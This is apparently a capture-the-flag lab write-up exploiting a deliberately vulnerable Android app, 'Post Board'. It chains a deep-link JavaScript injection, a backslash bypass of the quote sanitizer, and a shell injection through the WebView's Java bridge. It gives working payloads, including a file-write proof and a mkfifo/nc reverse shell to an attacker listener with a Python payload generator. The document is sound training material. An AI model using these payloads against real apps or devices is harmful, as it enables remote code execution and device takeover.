# Post Board - WebView XSS to RCE Writeup

**Difficulty:** Medium
**Target:** com.mobilehackinglab.postboard (Android APK)
**Objective:** Exploit an XSS vulnerability in an Android WebView to achieve Remote Code Execution via the exposed Java interface.

---

## Setup

Install the APK onto the running Android emulator using adb:

```bash
adb install com.mobilehackinglab.postboard.apk
```

`adb install` pushes the APK to the connected device or emulator and installs it. The `-t` flag is not needed here since the app is already marked debuggable.

Confirm the package was installed correctly:

```bash
adb shell pm list packages | grep mobile
```

`adb shell` opens a shell on the device and runs the given command. `pm list packages` lists all installed packages. The grep filters for our target. Expected output: `package:com.mobilehackinglab.postboard`.

---

## Static Analysis

### Decompiling the APK

```bash
jadx -d /tmp/postboard_decompiled ~/Downloads/labs/com.mobilehackinglab.postboard.apk
```

`jadx` decompiles the APK back into readable Java source code. The `-d` flag sets the output directory. This produces the full source tree including all activity, interface, and utility classes.

### AndroidManifest.xml

The manifest reveals the following critical configuration:

```xml
android:debuggable="true"
```

This means the app can be attached to with a debugger and the adb shell has elevated access to the app's process.

```xml
<activity
    android:name="com.mobilehackinglab.postboard.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="postboard" android:host="postmessage"/>
    </intent-filter>
</activity>
```

`android:exported="true"` means any external application or the adb tool can send intents directly to `MainActivity`. The intent filter registers a custom deep link scheme: any URL in the format `postboard://postmessage/...` will open this activity. This is the entry point for our attack.

### MainActivity - setupWebView()

```java
private final void setupWebView(WebView webView) {
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebChromeClient(new WebAppChromeClient());
    webView.addJavascriptInterface(new WebAppInterface(), "WebAppInterface");
    webView.loadUrl("file:///android_asset/index.html");
}
```

Three dangerous configurations here. `setJavaScriptEnabled(true)` allows JavaScript to execute inside the WebView. `addJavascriptInterface(new WebAppInterface(), "WebAppInterface")` exposes a Java object to the JavaScript context — any JS running in this WebView can call methods on that object directly using `window.WebAppInterface`. Finally, `loadUrl("file:///android_asset/index.html")` loads a local HTML file. Because the page is loaded from `file://`, it has access to the full `addJavascriptInterface` bridge with no origin restriction.

### MainActivity - handleIntent()

```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (!Intrinsics.areEqual("android.intent.action.VIEW", action) || data == null
            || !Intrinsics.areEqual(data.getScheme(), "postboard")
            || !Intrinsics.areEqual(data.getHost(), "postmessage")) {
        return;
    }
    try {
        String path = data.getPath();
        byte[] bArrDecode = Base64.decode(path != null ? StringsKt.drop(path, 1) : null, 8);
        String message = StringsKt.replace$default(
            new String(bArrDecode, Charsets.UTF_8),
            "'", "\\'",
            false, 4, null
        );
        activityMainBinding2.webView.loadUrl(
            "javascript:WebAppInterface.postMarkdownMessage('" + message + "')"
        );
    } catch (Exception e) {
        activityMainBinding.webView.loadUrl(
            "javascript:WebAppInterface.postCowsayMessage('" + e.getMessage() + "')"
        );
    }
}
```

This method processes the incoming deep link. When a `postboard://postmessage/` URL arrives, it takes the path component (everything after the host), drops the leading `/` using `StringsKt.drop(path, 1)`, then base64-decodes the remaining string using `Base64.decode(..., 8)`. Flag `8` is `Base64.URL_SAFE`, meaning it accepts URL-safe base64 characters.

After decoding, it performs a single sanitization step: replacing all single-quote characters (`'`) with an escaped form (`\'`). This is the only protection applied. Backslashes are not escaped.

The result is then injected directly into a JavaScript URL string:

```
javascript:WebAppInterface.postMarkdownMessage('<decoded_input>')
```

This string is passed to `webView.loadUrl()`, which evaluates it as JavaScript inside the WebView. The decoded input is placed inside a JavaScript string literal delimited by single quotes with no other protection — this is the injection point.

### WebAppInterface

```java
@JavascriptInterface
public final void postMarkdownMessage(String markdownMessage) {
    // converts markdown to HTML using regex, stores in cache
}

@JavascriptInterface
public final void postCowsayMessage(String cowsayMessage) {
    String asciiArt = CowsayUtil.INSTANCE.runCowsay(cowsayMessage);
    // HTML-encodes the output and stores it in the cache
    this.cache.addMessage("<pre>" + html + "</pre>");
}

@JavascriptInterface
public final String getMessages() {
    return new JSONArray(this.cache.getMessages()).toString();
}
```

Methods annotated with `@JavascriptInterface` are the only ones visible to JavaScript through the bridge (a security improvement introduced in Android 4.2). Both `postMarkdownMessage` and `postCowsayMessage` are exposed. `postCowsayMessage` passes its argument to `CowsayUtil`, which is where the command execution happens.

### CowsayUtil - runCowsay()

```java
public final String runCowsay(String message) {
    try {
        String[] command = {"/bin/sh", "-c", CowsayUtil.scriptPath + ' ' + message};
        Process process = Runtime.getRuntime().exec(command);
        // reads and returns stdout
    } catch (Exception e) {
        return "cowsay: " + e.getMessage();
    }
}
```

This is the shell injection sink. The command array is `["/bin/sh", "-c", "/path/to/cowsay.sh " + message]`. The third element is a single string passed to `sh -c`, meaning the shell parses it as a complete command line. Because `message` is appended by string concatenation with no sanitization, any shell metacharacters in `message` are interpreted by the shell. The `$(...)` command substitution syntax will cause the shell to execute whatever is inside the parentheses and substitute its output inline.

`CowsayUtil.initialize()` extracts `cowsay.sh` from the APK's assets into the app's private files directory and marks it executable before `runCowsay()` is ever called.

### index.html

```javascript
function updateMessages() {
    var jsonString = window.WebAppInterface.getMessages();
    var messages = JSON.parse(jsonString);
    var messageBoard = document.getElementById('messageBoard');
    messageBoard.innerHTML = '';
    messages.forEach(function(message) {
        var stickyNote = document.createElement('div');
        stickyNote.className = 'sticky-note';
        stickyNote.innerHTML = message;
        messageBoard.appendChild(stickyNote);
    });
}
```

The page renders cached messages by assigning them to `innerHTML` without any sanitization. This means any HTML stored in the cache — including HTML produced by `postMarkdownMessage`'s markdown conversion or by `postCowsayMessage` — will be rendered and any event handlers in that HTML will execute. This is a secondary XSS surface, though the primary attack goes through the deep link.

---

## Vulnerability Analysis

### JavaScript String Injection via Deep Link

The sanitizer in `handleIntent()` only escapes single quotes. It does not escape backslashes. This allows the following bypass:

If the decoded payload begins with `\` followed by `'`, the sanitizer sees the `'` and replaces it with `\'`. The backslash before it is left untouched. The result in the string is `\\` followed by `'`.

In JavaScript, `\\` inside a string literal is an escaped backslash — it represents a single literal `\` character. The `'` after it is not part of the escape sequence; it closes the string. So the string is terminated after the backslash character, and anything following `)` runs as free JavaScript.

Payload structure:

```
\');[arbitrary JavaScript here]//
```

After the sanitizer processes it (only the first `'` is a quote, so only it gets escaped):

```
\\');[arbitrary JavaScript here]//
```

The final JavaScript URL passed to `loadUrl`:

```javascript
javascript:WebAppInterface.postMarkdownMessage('\\');[arbitrary JavaScript here]//')
```

JavaScript evaluates this as:
- `WebAppInterface.postMarkdownMessage('\\')` — a valid call with a one-character backslash string
- `;` — statement separator
- `[arbitrary JavaScript here]` — executes freely
- `//` — line comment, discards the trailing `')`

XSS achieved.

### Critical Subtlety: The Sanitizer Breaks Injected String Literals

The sanitizer replaces ALL single quotes in the decoded payload — including any that appear inside the injected JavaScript code itself. If the injected code contains string arguments like `postCowsayMessage('$(id)')`, those inner quotes are also escaped to `\'...\')`, which produces a JavaScript syntax error outside of a string context.

The fix is to use JavaScript backtick template literals instead of single quotes for any string arguments in the injected code. Backtick characters are not touched by the sanitizer:

```javascript
WebAppInterface.postCowsayMessage(`$(id)`)
```

The backtick string `` `$(id)` `` contains a literal `$` followed by `(id)`. In JavaScript template literals, only `${...}` triggers interpolation — `$(...)` is not a template substitution, so the string passed to Java is the literal text `$(id)`. The shell then evaluates this as command substitution.

### Shell Command Injection in CowsayUtil

The string `$(id)` passed to `runCowsay()` becomes part of the shell command:

```
/bin/sh -c "/data/user/0/com.mobilehackinglab.postboard/files/cowsay.sh $(id)"
```

The shell evaluates `$(id)` as a command substitution, runs the `id` command, and substitutes the output as the argument to `cowsay.sh`. Any shell command can be placed inside `$(...)`.

---

## Exploitation

### Step 1 - Confirm JavaScript Injection

Before testing anything else, confirm that the XSS fires. The payload `\');alert(1)//` contains no string arguments so the sanitizer does not break it.

Encode the payload:

```python
import base64
payload = "\\');alert(1)//"
print(base64.b64encode(payload.encode()).decode())
# XCcpO2FsZXJ0KDEpLy8=
```

Send the deep link:

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "postboard://postmessage/XCcpO2FsZXJ0KDEpLy8="
```

`adb shell am start` uses the Android Activity Manager to start an activity. `-a android.intent.action.VIEW` sets the intent action. `-d` provides the data URI. The app receives this intent and `handleIntent()` decodes the base64 path, sanitizes it, and calls `loadUrl("javascript:...")`. An alert dialog should appear in the app.

### Step 2 - Confirm RCE with File Write

Write the output of `id` to a file inside the app's data directory to confirm shell command execution. The `id` command outputs the current user, group, and security context.

Payload:

```
\');WebAppInterface.postCowsayMessage(`$(id>/data/data/com.mobilehackinglab.postboard/pwned.txt)`)//
```

The `$(id>/data/data/.../pwned.txt)` runs `id` and redirects its standard output to the file. The `>` without a space is valid shell syntax. The command substitution returns empty string to cowsay since stdout was redirected. cowsay.sh runs with no argument. The file is written.

Encode and send:

```bash
adb shell am force-stop com.mobilehackinglab.postboard
adb shell am start -a android.intent.action.VIEW \
  -d "postboard://postmessage/XCcpO1dlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZShgJChpZD4vZGF0YS9kYXRhL2NvbS5tb2JpbGVoYWNraW5nbGFiLnBvc3Rib2FyZC9wd25lZC50eHQpYCk7dXBkYXRlTWVzc2FnZXMoKS8v"
```

`am force-stop` kills the app process first. This is required because `handleIntent()` is only called from `onCreate()` — if the Activity is already running and at the top of the stack, Android may not call `onCreate()` again, so the deep link would not be processed.

Verify:

```bash
adb shell cat /data/data/com.mobilehackinglab.postboard/pwned.txt
```

Output:
```
uid=10213(u0_a213) gid=10213(u0_a213) groups=10213(u0_a213),3003(inet),9997(everybody),20213(u0_a213_cache),50213(all_a213) context=u:r:untrusted_app:s0:c213,c256,c512,c768
```

RCE confirmed. The command ran as the app's UID `u0_a213` inside the `untrusted_app` SELinux context.

### Step 3 - Reverse Shell

Before crafting the reverse shell, check what tools are available on the device and confirm network connectivity:

```bash
adb shell 'echo "CONNECTIVITY_TEST" | nc -w 3 192.168.64.128 9999'
```

This runs `nc` from within adb shell (not via our injection) to confirm that the emulator can reach the Kali listener IP. The `-w 3` sets a 3-second timeout. Run `nc -nlvp 9999` on Kali first, then send this. If Kali's listener sees `CONNECTIVITY_TEST`, the network path is open.

The emulator runs on QEMU's SLiRP network stack. The emulator's own IP is on `10.0.2.x`, but its outbound connections reach the host (Kali) at Kali's physical eth0 IP (`192.168.64.128`). The ping through adb also works to this IP, confirming the route.

Important constraints to work around when building the reverse shell:

The Android system shell is `mksh` or toybox's `sh`, not bash. The `/dev/tcp` bash pseudo-device for network connections does not exist. The `/tmp` directory is not accessible to app processes. The reverse shell process must be detached from the parent shell, which exits as soon as `cowsay.sh` finishes — if the reverse shell process is a direct child and not properly backgrounded, it may be killed when the parent exits.

The solution uses `mkfifo` (a named pipe) stored in the app's own data directory, with the entire pipeline wrapped in `(...)` and backgrounded with `&`. This creates a bidirectional pipe: `nc` reads from the pipe and sends to Kali, Kali's input goes back through `nc`, then into the pipe and into `sh`, whose output goes back to `nc`.

The shell command injected:

```bash
rm -f /data/data/com.mobilehackinglab.postboard/f
mkfifo /data/data/com.mobilehackinglab.postboard/f
(cat /data/data/com.mobilehackinglab.postboard/f | /system/bin/sh -i 2>&1 | nc 192.168.64.128 9999 > /data/data/com.mobilehackinglab.postboard/f) &
```

`rm -f` removes any previous pipe file. `mkfifo` creates a named FIFO pipe. The pipeline inside `(...)` feeds the pipe into `sh`, which runs commands received from nc, and sends its output (including stderr via `2>&1`) back to nc, which sends it to Kali. The whole group is backgrounded with `&` so the parent shell exits immediately after creating the pipe, and the reverse shell process runs independently.

This command is base64-encoded to avoid issues with special characters passing through the injection chain:

```python
import base64

cmd = (
    "rm -f /data/data/com.mobilehackinglab.postboard/f;"
    "mkfifo /data/data/com.mobilehackinglab.postboard/f;"
    "(cat /data/data/com.mobilehackinglab.postboard/f|"
    "/system/bin/sh -i 2>&1|nc 192.168.64.128 9999 >"
    "/data/data/com.mobilehackinglab.postboard/f) &"
)
b64 = base64.b64encode(cmd.encode()).decode()

# The shell injection: decode and pipe to sh in background
shell_injection = f"echo {b64}|base64 -d|sh &"

# JS payload using backtick template literal to avoid quote sanitization
raw = f"\\');WebAppInterface.postCowsayMessage(`$({shell_injection})`)//"
encoded = base64.b64encode(raw.encode()).decode()
print(f'postboard://postmessage/{encoded}')
```

The `echo B64|base64 -d|sh &` wrapper decodes and executes the reverse shell command via a background shell, keeping the special characters away from the injection chain entirely.

**Start the listener on Kali (Terminal 1):**

```bash
nc -nlvp 9999
```

`-n` disables DNS resolution, `-l` enables listen mode, `-v` is verbose, `-p 9999` sets the port.

**Force-stop the app and send the payload (Terminal 2):**

```bash
adb shell am force-stop com.mobilehackinglab.postboard && \
adb shell am start -a android.intent.action.VIEW \
  -d "postboard://postmessage/XCcpO1dlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZShgJChlY2hvIGNtMGdMV1lnTDJSaGRHRXZaR0YwWVM5amIyMHViVzlpYVd4bGFHRmphMmx1WjJ4aFlpNXdiM04wWW05aGNtUXZaanR0YTJacFptOGdMMlJoZEdFdlpHRjBZUzlqYjIwdWJXOWlhV3hsYUdGamEybHVaMnhoWWk1d2IzTjBZbTloY21Rdlpqc29ZMkYwSUM5a1lYUmhMMlJoZEdFdlkyOXRMbTF2WW1sc1pXaGhZMnRwYm1kc1lXSXVjRzl6ZEdKdllYSmtMMlo4TDNONWMzUmxiUzlpYVc0dmMyZ2dMV2tnTWo0bU1YeHVZeUF4T1RJdU1UWTRMalkwTGpFeU9DQTVPVGs1SUQ0dlpHRjBZUzlrWVhSaEwyTnZiUzV0YjJKcGJHVm9ZV05yYVc1bmJHRmlMbkJ2YzNSaWIyRnlaQzltS1NBbXxiYXNlNjQgLWR8c2ggJilgKS8v"
```

The `&&` chaining ensures the force-stop completes before the start command runs. Terminal 1 receives the connection:

```
connect to [192.168.64.128] from (UNKNOWN) [192.168.64.128] 52816
/system/bin/sh: can't find tty fd: No such device or address
/system/bin/sh: warning: won't have full job control
:/ $
```

The TTY warning appears because there is no pseudo-terminal allocated — `mkfifo` provides a raw byte stream, not a TTY. The shell is fully functional. Commands execute normally.

```
:/ $ id
uid=10213(u0_a213) gid=10213(u0_a213) groups=10213(u0_a213),3003(inet),9997(everybody),20213(u0_a213_cache),50213(all_a213) context=u:r:untrusted_app:s0:c213,c256,c512,c768
```

---
